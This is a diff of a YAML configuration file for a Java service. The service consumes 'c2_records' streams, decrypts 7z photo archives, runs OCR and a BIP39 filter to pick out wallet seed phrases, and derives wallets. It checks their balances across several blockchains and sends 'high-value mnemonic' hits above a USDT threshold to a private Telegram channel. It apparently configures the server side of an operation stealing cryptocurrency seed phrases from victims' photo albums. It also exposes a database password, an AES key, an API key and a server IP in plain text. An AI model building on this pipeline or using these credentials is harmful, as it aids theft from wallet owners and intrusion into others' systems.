@@ -1,5 +1,5 @@
 ﻿server:
-  port: 8102
+  port: 8402
   max-http-header-size: 2MB
   tomcat:
     max-http-form-post-size: 50MB
@@ -10,6 +10,19 @@
     enabled: true
     mime-types: application/json,application/xml,text/html,text/plain
     min-response-size: 1024
+
+logging:
+  level:
+    root: INFO
+    com.consume: INFO
+    org.apache.kafka: WARN
+    org.apache.kafka.clients.consumer.ConsumerConfig: ERROR
+    org.apache.kafka.clients.producer.ProducerConfig: ERROR
+    org.apache.kafka.common.utils.AppInfoParser: WARN
+    org.springframework.kafka: WARN
+    com.amazonaws: WARN
+    com.amazonaws.util.Base64: ERROR
+    com.amazonaws.services.s3: WARN
 
 spring:
   application:
@@ -26,12 +39,15 @@ spring:
       matching-strategy: ant_path_matcher
   servlet:
     multipart:
-       max-file-size: 500MB
-       max-request-size: 500MB
+      max-file-size: 500MB
+      max-request-size: 500MB
   jackson:
     date-format: yyyy-MM-dd HH:mm:ss
     time-zone: GMT+8
 
+  # ---------------------------------------------------------------------------
+  # 2. 基础设施（MySQL / Redis / Kafka 连接；换环境主要改这里）
+  # ---------------------------------------------------------------------------
   datasource:
     driver-class-name: com.mysql.cj.jdbc.Driver
     #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8&useServerPrepStmts=true&cachePrepStmts=true
@@ -41,8 +57,6 @@ spring:
     username: ioslianjie
     password: BAF4R22mwenXXxEH
     type: com.alibaba.druid.pool.DruidDataSource
-    # 单实例 32C：消费侧重，连接池保留较大；全栈合计建议 MySQL max_connections>=500
-    # 消费积压调优：concurrency 建议 ≤ c2_records 分区数；多实例时各实例 concurrency 之和勿超过分区数太多
     initialSize: 16
     minIdle: 16
     maxActive: 120
@@ -59,21 +73,19 @@ spring:
   kafka:
     bootstrap-servers: 154.82.73.206:9092
     consumer:
-      # 【换套必改】Kafka 消费组；另一套用不同 group-id
-      group-id: consumer-group
+      group-id: consumer-group          # 【换套必改】主通道消费组
       key-deserializer: org.apache.kafka.common.serialization.StringDeserializer
       value-deserializer: org.apache.kafka.common.serialization.StringDeserializer
       auto-offset-reset: earliest
       enable-auto-commit: false
-      max-poll-records: 500
-      fetch-min-size: 1024           # /t 尽快拉，少等凑批
-      fetch-max-wait: 200            # 最多等 200ms
+      max-poll-records: 500 
+      fetch-min-size: 1024
+      fetch-max-wait: 200
       properties:
         spring.json.trusted.packages: "*"
         max.poll.interval.ms: 600000
         session.timeout.ms: 45000
         heartbeat.interval.ms: 15000
-    # DLQ 发布需要 producer（与消费共用 bootstrap）
     producer:
       key-serializer: org.apache.kafka.common.serialization.StringSerializer
       value-serializer: org.apache.kafka.common.serialization.StringSerializer
@@ -84,7 +96,7 @@ spring:
     listener:
       missing-topics-fatal: false
       ack-mode: record
-      concurrency: 16               # 单实例对齐 c2_records 12 分区；多实例时总和勿超分区数
+      concurrency: 16                  # 主通道并发（≤ 主 topic 分区数）
 
 redis:
   host: 127.0.0.1
@@ -93,85 +105,116 @@ redis:
   db: 0
   timeout: 3000
   pool:
-    maxTotal: 32
-    maxIdle: 12
-    minIdle: 4
+    maxTotal: 96
+    maxIdle: 32
+    minIdle: 8
 
 # =============================================================================
-# 【换另一套时必改】17 通知通道隔离（须与同套 17-binding / 17-report 一致）
+# 3. 【常调】双机角色 + 吞吐（压测/扩容优先改这一段）
 # =============================================================================
+c2:
+  # --- 角色开关（同包双机；也可用启动参数覆盖）---
+  # 主机：  main-enabled=true  album-enabled=false
+  # 相册机：main-enabled=false album-enabled=true
+  # 单机：  两者都 true（勿两台相册机同进 consumer-group-t）
+  channel:
+    main-enabled: false
+    album-enabled: true
+  kafka:
+    # --- Topic / 组 / DLQ（换套与 binding/report 对齐）---
+    topic: c2_records
+    topic-t: c2_records_t
+    dlq-topic: c2_records.DLT
+    dlq-topic-t: c2_records_t.DLT
+    consumer:
+      group-id-t: consumer-group-t
+      # --- 相册 Kafka 成套（仅相册 ConsumerFactory）---
+      max-poll-records-t: 100           # 过大→CommitFailed；过小→LAG 慢
+      max-poll-interval-ms-t: 300000    # 5 分钟
+      session-timeout-ms-t: 60000
+      heartbeat-interval-ms-t: 20000
+      request-timeout-ms-t: 120000
+      default-api-timeout-ms-t: 120000
+    listener:
+      concurrency-t: 20                 # 相册并发；CommitFailed 多可降到 16
+    retry:
+      max-elapsed-ms: 10000
+      max-elapsed-ms-t: 5000
+
 news4:
-  redis-prefix: 'news4:'              # 【redis 通道换套改】与 binding/report 相同
+  redis-prefix: 'news4:'                # 【换套】与 binding/report 相同
   device-bind-python: true
-  c2:
-    notify-transport: redis           # kafka | redis（二选一）
-    notify-listen:
-      enabled: true
-    notify-stream: c2:new             # 【redis 通道换套可改】主通道后缀（非 /t）
-    notify-stream-t: c2:new:t         # /t 相册专用后缀
-    notify-group: news4-c2-notify     # 主通道消费组
-    notify-group-t: news4-c2-notify-t # /t 相册消费组
-    notify-worker-threads: 8
-    notify-worker-threads-t: 16
-    notify-read-block-ms: 2000
-    notify-read-block-ms-t: 2000
-    notify-read-count: 16
-    notify-read-count-t: 16
-    notify-claim-idle-ms: 180000
-    notify-claim-idle-ms-t: 180000
-    notify-claim-count: 20
-    notify-claim-count-t: 20
-    work:
-      enabled: true
-      load-retry-max: 5              # /t 量大时缩短等库时间
-      load-retry-delay-ms: 100
   album:
-    #persist: true
+    pool:                               # 解图（7z）
+      core-size: 32
+      max-size: 64
+      queue-capacity: 2048
+    filter-pool:                        # OCR+BIP39；瓶颈时优先加这里
+      core-size: 32
+      max-size: 64
+      queue-capacity: 4096
+    upload-pool:                        # S3
+      core-size: 32
+      max-size: 64
+      queue-capacity: 4000
+    # --- 相册路径 / 过滤规则 / 上云落库 ---
     #photo-dir: D:/c2_records/photos
     photo-dir: /opt/news4/data/photos
     photo-url-prefix: data/photos
-    pool:
-      core-size: 32                 # 解图并发（解密 7z）
-      max-size: 64
-      queue-capacity: 2048
-    # S3 上传独立队列（与解图 album-mat 隔离）
-    upload-pool:
-      core-size: 32                 # 上云并发（网络 IO）
-      max-size: 64
-      queue-capacity: 4000
+    mnemonic-filter:
+      enabled: true
+      # Windows: C:/Program Files/Tesseract-OCR/tessdata ；空=自动探测 
+      tessdata-path: '/usr/share/tesseract-ocr/4.00/tessdata'
+      ocr-language: eng
+      min-width: 60
+      min-height: 60
+      min-bytes: 800
+      max-bytes: 20000000
+      min-window-hits: 10
+      min-total-hits: 10
+      require-checksum: false
     cloud:
       enabled: true
       key-prefix: photos
-      # 上云成功后批量写 album：凑满 size 或每隔 interval 刷一次
       batch-insert-enabled: true
       batch-insert-size: 50
       batch-insert-interval-ms: 200
+  # --- C2 通知运输（kafka|redis）与 Redis Stream（仅 redis 时用）---
+  c2:
+    notify-transport: redis
+    notify-listen:
+      enabled: true
+    notify-stream: c2:new
+    notify-stream-t: c2:new:t
+    notify-group: news4-c2-notify
+    notify-group-t: news4-c2-notify-t
+    # Redis 消费吞吐（对标 Kafka concurrency / max-poll-records）
+    notify-worker-threads: 12           # 主通道
+    notify-worker-threads-t: 28         # 相册；勿超过 CPU 核数太多
+    notify-read-count: 32               # 主每次 XREADGROUP 条数
+    notify-read-count-t: 48             # 相册每次拉取
+    notify-read-block-ms: 1000
+    notify-read-block-ms-t: 1000        # 有货时更快醒来
+    notify-claim-idle-ms: 180000
+    notify-claim-idle-ms-t: 180000
+    notify-claim-count: 32
+    notify-claim-count-t: 32
+    work:
+      enabled: true
+      load-retry-max: 5
+      load-retry-delay-ms: 100
+
   mnemonic:
-    mnemonic-aes-key: 'Mn3m0n1c@2024!SecureKey#news2' # 助记词 AES 密钥
+    mnemonic-aes-key: 'Mn3m0n1c@2024!SecureKey#news2'
   wallet-derive:
     pool:
       core-size: 4
       max-size: 10
       queue-capacity: 2000
 
-
-# 【kafka 通道换套必改】须与 17-binding-server / 17-report-server 的 c2.kafka.topic 相同
-c2:
-  kafka:
-    topic: c2_records               # 主通道（/a /event /u /us /nb /ub /uj 等；旧 /t 见 consume-legacy-t-on-main）
-    topic-t: c2_records_t           # /t 相册专用 topic
-    dlq-topic: c2_records.DLT
-    dlq-topic-t: c2_records_t.DLT
-    # 停写清积压：true=主通道也处理 c2_records 里遗留的 /t；LAG 清零后务必改回 false
-    consume-legacy-t-on-main: false
-    consumer:
-      group-id-t: consumer-group-t    # /t 专用消费组
-    listener:
-      concurrency-t: 24             # /t 专用并发（须 ≤ c2_records_t 分区数）
-    retry:
-      max-elapsed-ms: 30000         # 主通道：重试总时长，超时进 DLQ（30 秒）
-      max-elapsed-ms-t: 5000        # 相册 /t：其它可重试失败（如 body 未齐）最多 5 秒，超时进 DLQ
-
+# -----------------------------------------------------------------------------
+# 4. 其它业务（监控 / Telegram / S3）
+# -----------------------------------------------------------------------------
 monitor:
   api_post: https://mornitor.worldpay.club
   api_key: ak_acc6f0ce66e526602e91b818
@@ -191,7 +234,6 @@ monitor:
     bsc-rpc: https://bsc-dataseed.binance.org,https://bsc-dataseed1.binance.org,https://bsc.publicnode.com,https://bsc-dataseed2.binance.org
     tron-api: https://api.trongrid.io
     btc-api: https://blockstream.info/api,https://mempool.space/api
-    # SOL：USDT 查询较慢，已做多节点回退；超时见 timeout-ms（USDT 内部至少 15s）
     sol-rpc: https://api.mainnet-beta.solana.com,https://1rpc.io/sol,https://solana.drpc.org,https://solana-rpc.publicnode.com
     timeout-ms: 8000
     pool-size: 10
@@ -209,7 +251,6 @@ telegram:
   max-concurrent: 4
   acquire-timeout-ms: 15000
 
-# High-value mnemonic: USDT sum or any native threshold -> private TG + private_mnemonic
 maxnotice:
   enabled: true
   usdt-sum-threshold: 1000
